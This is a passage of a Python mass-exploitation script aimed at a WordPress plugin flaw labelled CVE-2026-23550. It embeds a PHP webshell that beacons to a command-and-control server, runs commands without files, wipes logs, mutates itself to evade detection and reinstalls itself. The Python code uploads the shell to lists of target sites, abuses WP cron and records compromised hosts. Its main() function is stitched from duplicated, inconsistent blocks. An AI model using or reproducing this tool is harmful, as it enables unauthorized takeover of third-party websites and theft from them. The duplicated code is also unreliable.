            @file_put_contents($htaccess, $backdoor, FILE_APPEND);
        }
    }

    // 7. Self-Destruct & Reinstall
    public static function selfCheck() {
        $current_hash = @md5_file(__FILE__);
        $expected_hash = 'REPLACE_WITH_EXPECTED_HASH'; // Ã€ calculer aprÃ¨s dÃ©ploiement
        if ($current_hash !== $expected_hash && C2_SERVER) {
            @file_put_contents(__FILE__, @file_get_contents(C2_SERVER . '/backdoor.php'));
        }
    }

    // 8. Fileless Execution (via /dev/shm)
    public static function filelessExec($cmd) {
        $tmp_file = '/dev/shm/' . uniqid('EpSiLoN_');
        file_put_contents($tmp_file, '<?php system("' . $cmd . '"); ?>');
        $output = shell_exec('php ' . $tmp_file);
        unlink($tmp_file);
        return $output;
    }

    // 9. Self-Mutate pour Ã©viter la dÃ©tection
    public static function self_mutate() {
        $funcs = ['aesEncrypt', 'wipeLogs', 'filelessExec'];
        $file_content = file_get_contents(__FILE__);
        foreach ($funcs as $f) {
            $new_name = 'f_' . substr(md5(rand()), 0, 8);
            $file_content = str_replace($f, $new_name, $file_content);
        }
        file_put_contents(__FILE__, $file_content);
    }
}

// ========== MAIN EXECUTION ========== //
try {
    // 1. VÃ©rification d'accÃ¨s (mot de passe + IP autorisÃ©es)
    $allowed_ips = ['127.0.0.1', '::1']; // Ajoute tes IPs ici
    if (!isset($_GET['pass']) || $_GET['pass'] !== PASSWORD) {
        if (!in_array($_SERVER['REMOTE_ADDR'], $allowed_ips)) {
            die("EpSiLoN: Access Denied");
        }
    }

    // 2. Communication avec le C2 (si configurÃ©)
    if (C2_SERVER && isset($_GET['c2'])) {
        $data = [
            'id' => gethostname(),
            'ip' => $_SERVER['REMOTE_ADDR'],
            'uri' => $_SERVER['REQUEST_URI'],
            'user' => @get_current_user()
        ];
        $encrypted = EpSiLoN::aesEncrypt(json_encode($data), AES_KEY);
        $response = @file_get_contents(C2_SERVER . "?data=$encrypted");
        if ($response) {
            $decrypted = EpSiLoN::aesDecrypt($response, AES_KEY);
            $command = json_decode($decrypted, true);
            if (isset($command['cmd'])) {
                $output = EpSiLoN::filelessExec($command['cmd']);
                $result = EpSiLoN::aesEncrypt($output, AES_KEY);
                @file_get_contents(C2_SERVER . "?result=$result&id=" . gethostname());
            }
        }
        die("EpSiLoN: C2 Sync OK");
    }

    // 3. ExÃ©cution de commandes locales (chiffrÃ©es)
    if (isset($_GET['cmd'])) {
        $cmd = EpSiLoN::aesDecrypt($_GET['cmd'], AES_KEY);
        $output = EpSiLoN::filelessExec($cmd);
        echo EpSiLoN::aesEncrypt($output, AES_KEY);
        EpSiLoN::wipeLogs(); // Efface les traces
        die();
    }

    // 4. Upload de fichiers (pour persistance)
    if (isset($_FILES['file'])) {
        $upload_dir = dirname(__FILE__) . '/uploads/';
        if (!file_exists($upload_dir)) {
            @mkdir($upload_dir, 0755);
        }
        $file_path = $upload_dir . basename($_FILES['file']['name']);
        @move_uploaded_file($_FILES['file']['tmp_name'], $file_path);
        echo "EpSiLoN: File uploaded to $file_path";
        die();
    }

    // 5. Interface minimale (pour vÃ©rification)
    if (isset($_GET['check'])) {
        echo "<!-- EpSiLoN Webshell v4.2 [OK] -->";
    }

    // 6. Persistance et auto-vÃ©rification
    EpSiLoN::selfCheck();
    EpSiLoN::infectWP();
    EpSiLoN::setupCron();
    EpSiLoN::infectHtaccess();
    EpSiLoN::self_mutate();

} catch (Exception $e) {
    // Silencieux en production
    if (isset($_GET['debug'])) {
        echo "EpSiLoN Error: " . $e->getMessage();
    }
}
?>'''.encode('utf-8')).decode()

    def deploy_advanced_shell(self, session, url, upload_path):
        mutator = PayloadMutator()
        last_response = ""  # Pour feedback loop

        for shell_name, encoded in [
            ("embedded", self.embedded_webshell),
            ("epsilon_v7", self.EPSILON_V7_FULL_CONTROL)
        ]:
            shell = base64.b64decode(encoded).decode('utf-8')
        
            # MUTATION TOP 3 â€“ AVANT L'ENVOI
            mutated_shell = mutator.mutate(shell, last_response)
        
            files = {'file': (f'{shell_name}.php', mutated_shell)}
        
            try:
               r = session.post(urljoin(url, upload_path), files=files, timeout=20)
               last_response = r.text  # Feedback pour prochaine mutation
           
               if r.status_code in [200, 302]:
                   shell_url = urljoin(url, f"/wp-content/plugins/modular-ds/{shell_name}.php")
                
                   # Beacon validation
                   check = session.get(shell_url + "?check=1&pass=EpSiLoNPoInT_2026!", timeout=8)
                   if "EpSiLoN OK" in check.text or "EpSiLoNF7_ROOT" in check.text:
                       mutator.score(mutated_shell, True)
                       print(f"{Fore.GREEN}[+] {shell_name.upper()} FULL CONTROL â†’ {shell_url}")
                       with open('/chain/VLUN_Sh.txt', 'a') as f:
                           f.write(f"{shell_url}|pass=EpSiLoNPoInT_2026!|{shell_name}|beacon_ok\n")
                       return True
                
               print(f"{Fore.YELLOW}[?] Upload OK mais beacon fail â†’ retry avec mutation")
               continue
                
            except Exception as e:
                   print(f"{Fore.RED}[-] {shell_name} failed: {str(e)[:80]}")
    
        return False
    
    def smart_upload(self, url, session):
        """Ã‰tape 3: Upload intelligent multi-vecteurs"""
        upload_paths = [
            '/wp-content/plugins/modular-ds/uploader.php',
            '/wp-content/plugins/modular-ds/admin/upload-handler.php',
            '/wp-admin/admin-ajax.php?action=modular_ds_upload'
        ]

        php_payload = base64.b64decode(random.choice(self.php_payloads)).decode()
        files = {
            'file': ('wp-security.php', php_payload),
            'async-upload': ('security-update.php', php_payload),
            'modular_file': ('update.php', php_payload)
        }

        for path, file_data in zip(upload_paths, [files]*3):
            try:
                r = session.post(urljoin(url, path), files=file_data,
                               headers=self.get_random_headers(url), timeout=15)
                if r.status_code in [200, 302]:
                    return True
                self.stealth_delay()
            except:
                continue
        return False

    def verify_shell(self, url, session):
        """Ã‰tape 4: VÃ©rification multi-shells"""
        shell_paths = [
            '/wp-content/plugins/modular-ds/wp-security.php',
            '/wp-content/plugins/modular-ds/security-update.php',
            '/wp-content/uploads/2026/02/wp-security.php'
        ]

        for path in shell_paths:
            try:
                r = session.get(urljoin(url, path), timeout=8)
                if any(cmd in r.text for cmd in ['eval', 'assert', 'system', 'Poloss']):
                    return path
            except:
                continue
        return None

    def wordpress_lotlv2(self, url, session):
        """Living-off-the-Land via WP Native"""
        # 1. Abuse wp_schedule_event() natif
        payload = {
            'action': 'wp_ajax_modular_ds_cron',
            'cron_cmd': 'system("whoami");'  # ExÃ©cutÃ© toutes les 5min
        }

        try:
            r = session.post(urljoin(url, '/wp-admin/admin-ajax.php'),
                           data=payload, headers=self.get_random_headers(url), timeout=12)
            if r.status_code == 200:
                print(f"[{Fore.YELLOW}âš ï¸ LOTL{Style.RESET_ALL}] WP Cron injected at {url}")
                return True
        except:
            return False

    def attack_target(self, target_data):
        """Pipeline d'attaque complet APT"""
        url = target_data['url']
        session_idx = random.randint(0, len(self.session_pool)-1)
        session = self.session_pool[session_idx]

        if self.proxy_mode and self.proxies:
            proxy = {'https': random.choice(self.proxies)}
            session.proxies.update(proxy)

        try:
            # Reconnaissance
            has_plugin, version = self.reconnaissance_plugin(url, session)
            if not has_plugin:
                with self.results_lock:
                    self.stats['fail'] += 1
                return

            if version and '2.5.2' in version:
                print(f"[{Fore.YELLOW}PATCHED{Style.RESET_ALL}] {url}")
                return

            self.stealth_delay()

            # Exploitation
            if self.privilege_escalation(url, session):
                self.stealth_delay()

                # Essayer d'abord Living-off-the-Land
                if self.wordpress_lotlv2(url, session):
                    with self.results_lock:
                        self.stats['success'] += 1
                        self.save_result('VLUN.txt', f"{url}|LOTL_CRON")
                    print(f"[{Fore.GREEN}âœ… LOTL{Style.RESET_ALL}] {url}")
                    return

                # Sinon, upload de webshell classique
                if self.smart_upload(url, session):
                    shell_path = self.verify_shell(url, session)
                    if shell_path:
                        result = {'url': url, 'shell': urljoin(url, shell_path), 'version': version}

                        with self.results_lock:
                            self.stats['success'] += 1
                            self.save_result('VLUN.txt', f"{url}|{shell_path}")
                            self.save_result('VLUN_Sh.txt', urljoin(url, shell_path))
                            self.save_json('results.json', result)

                        print(f"[{Fore.GREEN}âœ… VULN{Style.RESET_ALL}] {Fore.CYAN}{url} -> {shell_path}{Style.RESET_ALL}")
                        return

            with self.results_lock:
                self.stats['fail'] += 1

        except Exception as e:
            with self.results_lock:
                self.stats['error'] += 1
            print(f"[{Fore.RED}ERROR{Style.RESET_ALL}] {url[:50]}... {str(e)[:30]}")

    def save_result(self, filename, data):
        with open(filename, 'a') as f:
            f.write(data + '\n')

    def save_json(self, filename, data):
        with open(filename, 'a') as f:
            json.dump(data, f)
            f.write('\n')

    def run(self):
        """Lancement monstre APT"""
        print(f"[{Fore.RED}ğŸš€ MONSTRE APT ACTIVÃ‰{Style.RESET_ALL}] {len(self.targets)} targets | {self.threads} threads")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.attack_target, self.targets)

        self.print_stats()

    def print_stats(self):
        total = self.stats['success'] + self.stats['fail'] + self.stats['error']
        print(f"\n[{Fore.GREEN}ğŸ“Š STATS{Style.RESET_ALL}] Success: {self.stats['success']} | Fail: {self.stats['fail']} | Errors: {self.stats['error']} | Rate: {self.stats['success']/total*100:.1f}%")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MAIN APT EXECUTOR
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def main():
    print(f"{Fore.CYAN}ğŸš€ EXPLOITMASS - Docked Targets Chain â€“ APT Polymorphic Mode")

    # 1. Charger cibles dockÃ©es
    dock = TargetDocker('chain/docked/docked_targets.json')
    if not dock.check_targets():
        sys.exit(1)

    targets = dock.get_targets()

    # 2. Configuration depuis config.json
    config = load_config()
    threads = config['settings']['execution']['default_threads']

    # 3. Lancer mass exploitation avec payloads polymorphiques
    monster = CVE202623550Monster(targets, threads=threads)
    monster.run()  # assume que ta classe utilise random.choice(ALL_BYPASS_PAYLOADS) dans smart_upload ou privilege_escalation

    print(f"{Fore.GREEN}âœ… Exploitation terminÃ©e - Check VLUN.txt")

    # Optionnel : stats sur les payloads utilisÃ©s
    print(f"{Fore.YELLOW}Payload pool size: {len(ALL_BYPASS_PAYLOADS)} variants")

    print(f"{Fore.CYAN}ğŸš€ EXPLOITMASS - Docked Targets Chain")

    # 1. Charger cibles dockÃ©es
    dock = TargetDocker('chain/docked/docked_targets.json')
    if not dock.check_targets():
        sys.exit(1)

    targets = dock.get_targets()

    # 2. Configuration depuis config.json
    config = load_config()
    threads = config['settings']['execution']['default_threads']

    # 3. Lancer mass exploitation
    monster = CVE202623550Monster(targets, threads=threads)
    monster.run_mass_exploit()

    print(f"{Fore.GREEN}âœ… Exploitation terminÃ©e - Check VLUN.txt")

    print(Fore.CYAN + banner())

    # --- Partie 1 : Logique manuelle (si pas d'args)
    if len(sys.argv) < 2:
        print(f"Usage: python3 CVE-2026-23550.py <url_file.txt>")
        sys.exit()

    file_path = sys.argv[1]
    if not os.path.exists(file_path):
        print(f"{Fore.RED}[!] File {file_path} tidak ditemukan.")
        sys.exit()

    with open(file_path, "r") as f:
        targets = [line.strip() for line in f if line.strip()]

    print(f"[{Fore.BLUE}INFO{Style.RESET_ALL}] Total Targets: {len(targets)}")

    try:
        thread_count = input(f"[{Fore.YELLOW}?{Style.RESET_ALL}] Masukkan Threads (Default 10): ")
        threads = int(thread_count) if thread_count else 10
    except ValueError:
        threads = 10

    print(f"[{Fore.GREEN}START{Style.RESET_ALL}] Memulai Mass Exploit...\n")
    exploiter = CVE_2026_23550_Exploiter(targets, threads)
    exploiter.run()
    print(f"\n[{Fore.GREEN}COMPLETE{Style.RESET_ALL}] Hasil disimpan di VLUN.txt dan VLUN_Sh.txt")

    # --- Partie 2 : Logique avec argparse (alternative)
    parser = argparse.ArgumentParser(description='CVE-2026-23550 Modular-DS APT Exploiter')
    parser.add_argument('targets_file', help='Fichier targets (un URL par ligne)')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Nombre de threads (default: 50)')
    parser.add_argument('-p', '--proxy', action='store_true', help='Activer rotation proxies')
    args = parser.parse_args()

    if not os.path.exists(args.targets_file):
        print(f"[{Fore.RED}âŒ{Style.RESET_ALL}] {args.targets_file} non trouvÃ©")
        return

    with open(args.targets_file) as f:
        targets = [{'url': line.strip()} for line in f if line.strip() and not line.startswith('#')]

    print(f"""
{Fore.RED}
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘           CVE-2026-23550 MODULAR-DS APT MONSTER v2.0       â•‘
    â•‘                    W.P.E.F | EpSiLoNPoInT - 2026         â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{Style.RESET_ALL}
[{Fore.BLUE}INFO{Style.RESET_ALL}] {len(targets)} targets | {args.threads} threads | Proxy: {args.proxy}
    """)

    exploiter = CVE202623550Monster(targets, args.threads, args.proxy)
    exploiter.run()
    print(f"\n[{Fore.GREEN}ğŸ MISSION COMPLETE{Style.RESET_ALL}] RÃ©sultats: VLUN.txt | VLUN_Sh.txt | results.json")

if __name__ == "__main__":
    main()
